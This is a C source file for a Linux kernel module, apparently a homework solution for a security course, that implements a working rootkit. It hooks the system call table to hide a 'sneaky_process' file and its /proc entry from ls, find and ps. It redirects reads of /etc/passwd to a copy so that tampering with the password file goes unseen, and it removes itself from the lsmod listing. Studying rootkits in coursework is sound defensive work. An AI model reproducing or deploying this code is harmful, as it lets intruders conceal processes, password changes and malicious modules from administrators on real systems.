#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>


#include <linux/syscalls.h>
#include <linux/dirent.h>
#include <linux/string.h>

#define PREFIX "sneaky_process"

static char* pid = "";
module_param(pid, charp, 0);
MODULE_PARM_DESC(pid, "sneaky pid");


//This is a pointer to the system call table
static unsigned long *sys_call_table;

// Helper functions, turn on and off the PTE address protection mode
// for syscall_table pointer
int enable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  if(pte->pte &~_PAGE_RW){
    pte->pte |=_PAGE_RW;
  }
  return 0;
}

int disable_page_rw(void *ptr){
  unsigned int level;
  pte_t *pte = lookup_address((unsigned long) ptr, &level);
  pte->pte = pte->pte &~_PAGE_RW;
  return 0;
}

/*----------------------------getdent-----------------------------*/
// 1. hide the “sneaky_process” executable file from both the ‘ls’ and ‘find’
// “ls /home/userid/hw5” should show all files in that directory except for “sneaky_process”.
// “find /home/userid -name sneaky_process” should not return any results
// 2. executing process will have a directory under /proc that is named with its process ID (e.g /proc/1480)
// Your sneaky kernel module will hide the /proc/<sneaky_process_id> directory
// “ls /proc” should not show a sub-directory with the name "1480""
// “ps -a -u <your_user_id>” should not show an entry for process 1480 named “sneaky_process”

asmlinkage int(*original_getdents64)(struct pt_regs *regs);

asmlinkage int sneaky_getdents64(struct pt_regs* regs){
  int totalDirpLen = original_getdents64(regs);
  struct linux_dirent64* dirp = (void*)(regs->si);
  int curr = 0;
  while(curr < totalDirpLen){
    struct linux_dirent64* dirpTmp = (void*)dirp + curr;
    int dirpTmpLen = dirpTmp->d_reclen;
    char * dirpTmpName=dirpTmp->d_name;
    if(strcmp(dirpTmpName, "sneaky_process") == 0 || strcmp(dirpTmpName, pid) == 0){
      int lenToBeCopied = totalDirpLen - curr - dirpTmpLen;
      memmove((void*)dirpTmp, (void*)dirpTmp + dirpTmpLen, lenToBeCopied);
      totalDirpLen -= dirpTmpLen;
      continue;
    }
    curr += dirpTmpLen;
  }
  return totalDirpLen;
}

/*----------------------------openat-----------------------------*/
// 3. hide the modifications to the /etc/passwd file that the sneaky_process made
// "cat /etc/passwd" should return contents of the original password file
asmlinkage int (*original_openat)(struct pt_regs *);

asmlinkage int sneaky_sys_openat(struct pt_regs *regs)
{
  if(strcmp((char*)(regs->si), "/etc/passwd") == 0){
    const char* sneakyPasswdPath = "/tmp/passwd";
    copy_to_user((char*)(regs->si), sneakyPasswdPath, strlen(sneakyPasswdPath));
  }
  return (*original_openat)(regs);
}



/*----------------------------read-----------------------------*/
// 4. hide the fact that the sneaky_module itself is an installed kernel module
// The list of active kernel modules is stored in the /proc/modules file
// remove the contents of the line for “sneaky_mod” from the buffer of read data being returned
// “lsmod” should return a listing of all modules except for the “sneaky_mod”
asmlinkage ssize_t (*original_read)(struct pt_regs*);

asmlinkage ssize_t sneaky_read(struct pt_regs *regs){
  ssize_t bytesRead = original_read(regs);
  void* lineStart = strstr((char*)(regs->si), "sneaky_mod");
  if (lineStart != NULL) {
    void* lineEnd = strchr(lineStart, '\n');
    if(lineEnd !=NULL){
      lineEnd++;
      memmove(lineStart, lineEnd, ((void*)(regs->si) + bytesRead) - lineEnd);
      bytesRead -= lineEnd - lineStart;
    }
  }
  return (ssize_t)bytesRead;
}

/*----------------------------initialize & exit-----------------------------*/

// The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  // See /var/log/syslog or use `dmesg` for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");

  // Lookup the address for this symbol. Returns 0 if not found.
  // This address will change after rebooting due to protection
  sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");

  // This is the magic! Save away the original 'openat' system call
  // function address. Then overwrite its address in the system call
  // table with the function address of our new code.
  original_openat = (void *)sys_call_table[__NR_openat];
  original_getdents64 = (void*)sys_call_table[__NR_getdents64];
  original_read = (void*)sys_call_table[__NR_read];

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);
  
  sys_call_table[__NR_openat] = (unsigned long)sneaky_sys_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)sneaky_getdents64;
  sys_call_table[__NR_read] = (unsigned long)sneaky_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);

  return 0;       // to show a successful load 
}  


static void exit_sneaky_module(void) 
{
  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  // Turn off write protection mode for sys_call_table
  enable_page_rw((void *)sys_call_table);

  // This is more magic! Restore the original 'open' system call
  // function address. Will look like malicious code was never there!
  sys_call_table[__NR_openat] = (unsigned long)original_openat;
  sys_call_table[__NR_getdents64] = (unsigned long)original_getdents64;
  sys_call_table[__NR_read] = (unsigned long)original_read;

  // Turn write protection mode back on for sys_call_table
  disable_page_rw((void *)sys_call_table);  
}  


module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  
MODULE_LICENSE("GPL");